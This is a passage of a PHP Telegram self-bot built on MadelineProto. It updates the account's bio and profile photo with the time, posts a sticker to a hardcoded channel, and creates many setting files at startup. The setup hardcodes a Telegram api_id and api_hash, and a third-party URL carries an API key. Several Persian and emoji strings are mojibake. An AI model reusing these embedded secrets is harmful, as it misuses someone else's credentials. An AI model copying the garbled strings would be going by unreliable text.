                ["๐", "๐", "๐", "๐", "๐", "๐", " ๐", "๐", "๐ ", "๐ก"],
                ["๐ฌ", "๐ญ", "๐ฎ", "๐ฏ", "๐ฐ", "๐ฑ", "๐ฒ", "๐ณ", "๐ด", "๐ต"],
                ["โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐"],
                ["๐ถ", "า1", "า2", "า3", "า4", "า5", "า6", "า7", "า8", "า9า"]];
            $time = date("H:i");
            $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H:i"));
            $day_number = jdate('j');
            $month_number = jdate('n');
            $year_number = jdate('y');
            $day_name = jdate('l');
            $texts = [
                " ๐ฅ $time2 Tฯิฮฑแง ฮนส ๐ฅ $day_name  ๐ $year_number/$month_number/$day_number ๐ ",
                " ๐ฅ $time2 Tฯิฮฑแง ฮนส ๐ฅ $day_name  ๐ป $year_number/$month_number/$day_number ๐น ",
                " โค๏ธ $time2 Tฯิฮฑแง ฮนส โค๏ธ $day_name  ๐ $year_number/$month_number/$day_number ๐น ",
                " โค๏ธ $time2 Tฯิฮฑแง ฮนส โค๏ธ $day_name  ๐ $year_number/$month_number/$day_number ๐น ",
            ];
            $biotext = $texts[rand(0, count($texts) - 1)];
            yield $this->account->updateProfile(['about' => "$biotext"]);
            // $this->account->updateProfile(['about' => " ๐ฅ $time2 Tฯิฮฑแง ฮนส ๐ฅ $day_name  ๐ $year_number/$month_number/$day_number ๐ "]);
        }
        if ($cbio != 'off') {
            yield $this->account->updateProfile(['about' => bioToCustom(file_get_contents('cbio.txt'))]);
        }
        if ($timesticker == 'on') {
            yield $this->messages->sendMedia([
                'peer' => -1001178276703,
                'media' => [
                    '_' => 'inputMediaUploadedDocument',
                    'file' => 'sticker.webp',
                    'attributes' => [
                        [
                            '_' => 'documentAttributeSticker',
                            'alt' => '๐'
                        ]
                    ]
                ]
            ]);
        }
        if ($timepic == 'on') {
            $link = yield $this->getLocalContents('aks.txt');
            copy("https://citroapi.ir/profile/?key=Y3LC-EAAZ-75U9-5SDD&text=Pawn%20TIME&url=$link", 'time.jpg');
            $photos_Photo = $this->photos->uploadProfilePhoto(['file' => 'time.jpg']);

            $photos_Photos = yield $this->photos->getUserPhotos([
                'user_id' => yield $this->getSelf()["id"],
                'offset' => 0,
                'max_id' => 0,
                'limit' => 1,
            ]);
            $inputPhoto = [
                '_' => "inputPhoto",
                'id' => $photos_Photos["photos"]["0"]["id"],
                'access_hash' => $photos_Photos["photos"]["0"]["access_hash"],
                'file_reference' => "bytes"
            ];
            $Vector_of_long = yield $this->photos->deletePhotos([
                'id' => [$inputPhoto]
            ]);
        }
        return 40000;
    }

    public function onStart()
    {
        if (!file_exists('data.json')) {
            yield $this->filePutContents('data.json', '{"power":"on","adminStep":"","echo":"off","timebio":"off","part":"off","timepic":"off","bold":"off","mention":"off","coding":"off","strikethrough":"off","poker":"off","enemies":[],"answering":[],"muted":[] }');
        }
        if (!file_exists('member.json')) {
            yield $this->filePutContents('member.json', '{"members":[]}');
        }
        if (!file_exists('online.txt')) {
            yield $this->filePutContents('online.txt', 'off');
        }
        if (!file_exists('timesticker.txt')) {
            yield $this->filePutContents('timesticker.txt', 'off');
        }
        if (!file_exists('timebio.txt')) {
            yield $this->filePutContents('timebio.txt', 'off');
        }
        if (!file_exists('part.txt')) {
            yield $this->filePutContents('part.txt', 'off');
        }
        if (!file_exists('timepic.txt')) {
            yield $this->filePutContents('timepic.txt', 'off');
        }
        if (!file_exists('bold.txt')) {
            yield $this->filePutContents('bold.txt', 'off');
        }
        if (!file_exists('mention.txt')) {
            yield $this->filePutContents('mention.txt', 'off');
        }
        if (!file_exists('coding.txt')) {
            yield $this->filePutContents('coding.txt', 'off');
        }
        if (!file_exists('strikethrough.txt')) {
            yield $this->filePutContents('strikethrough.txt', 'off');
        }
        if (!file_exists('underline.txt')) {
            yield $this->filePutContents('underline.txt', 'off');
        }
        if (!file_exists('hashtag.txt')) {
            yield $this->filePutContents('hashtag.txt', 'off');
        }
        if (!file_exists('italic.txt')) {
            yield $this->filePutContents('italic.txt', 'off');
        }
        if (!file_exists('typing.txt')) {
            yield $this->filePutContents('typing.txt', 'off');
        }
        if (!file_exists('gameplay.txt')) {
            yield $this->filePutContents('gameplay.txt', 'off');
        }
        if (!file_exists('gamepv.txt')) {
            yield $this->filePutContents('gamepv.txt', 'off');
        }
        if (!file_exists('antilogin.txt')) {
            yield $this->filePutContents('antilogin.txt', 'off');
        }
        if (!file_exists('audioaction.txt')) {
            yield $this->filePutContents('audioaction.txt', 'off');
        }
        if (!file_exists('videoaction.txt')) {
            yield $this->filePutContents('videoaction.txt', 'off');
        }
        if (!file_exists('lockpv.txt')) {
            yield $this->filePutContents('lockpv.txt', 'off');
        }
        if (!file_exists('locklink.txt')) {
            yield $this->filePutContents('locklink.txt', 'off');
        }
        if (!file_exists('locktag.txt')) {
            yield $this->filePutContents('locktag.txt', 'off');
        }
        if (!file_exists('lockgp.txt')) {
            yield $this->filePutContents('lockgp.txt', 'off');
        }
        if (!file_exists('markread.txt')) {
            yield $this->filePutContents('markread.txt', 'off');
        }
        if (!file_exists('language.txt')) {
            yield $this->filePutContents('language.txt', 'en');
        }
        if (!file_exists('autochat.txt')) {
            yield $this->filePutContents('autochat.txt', 'off');
        }
        if (!file_exists('enfont.txt')) {
            yield $this->filePutContents('enfont.txt', 'off');
        }
        if (!file_exists('fafont.txt')) {
            yield $this->filePutContents('fafont.txt', 'off');
        }
        if (!file_exists('aks.txt')) {
            yield $this->filePutContents('aks.txt', 'off');
        }
        if (!file_exists('mention2.txt')) {
            yield $this->filePutContents('mention2.txt', 'off');
        }
        if (!file_exists('mentionid.txt')) {
            yield $this->filePutContents('mentionid.txt', 'off');
        }
        if (!file_exists('cbio.txt')) {
            yield $this->filePutContents('cbio.txt', 'off');
        }
        if (!file_exists('helper.txt')) {
            yield $this->filePutContents('helper.txt', 'off');
        }
        if (!file_exists('Sessions.txt')) {
            yield $this->filePutContents('Sessions.txt', 'ุจุฑุง? ููุง?ุด ุฏุณุชูุฑ Sessions ุฑุง ุจูุฑุณุช?ุฏ ู ุฏูุจุงุฑู ูุฑุงุฌุนู ูุฑูุง??ุฏ');
        }
        if (!file_exists('lockmedia.txt')) {
            yield $this->filePutContents('lockmedia.txt', 'off');
        }
        if (!file_exists('lockvia.txt')) {
            yield $this->filePutContents('lockvia.txt', 'off');
        }
        if (!file_exists('lockphoto.txt')) {
            yield $this->filePutContents('lockphoto.txt', 'off');
        }
        if (!file_exists('lockmention.txt')) {
            yield $this->filePutContents('lockmention.txt', 'off');
        }
        if (!file_exists('lockforward.txt')) {
            yield $this->filePutContents('lockforward.txt', 'off');
        }
        $genLoop = new GenericLoop([$this, 'genLoop'], 'update Status');
        $genLoop->start();
    }
}

$settings = [
    'serialization' => [
        'cleanup_before_serialization' => true,
    ],
    'logger' => [
        'max_size' => 1 * 1024 * 1024,
    ],
    'peer' => [
        'full_fetch' => false,
        'cache_all_peers_on_startup' => false,
    ], 'app_info' => [
        'api_id' => 3687497,
        'api_hash' =>
            '961d16c779b209c596881e08c6a42067']
];
//settings = ["logger" => ["logger_level" => 3, "max_size" => 3 * 1024 * 1024], "serialization" => ["serialization_interval" => 30, "cleanup_before_serialization" => true], "peer" => ["full_info_cache_time" => 30], 'app_info' => ['api_id' => 3687497, 'api_hash' => '961d16c779b209c596881e08c6a42067']];
$bot = new \danog\MadelineProto\API('X.session', $settings);
$bot->async(true);
$bot->startAndLoop(XHandler::class);
?>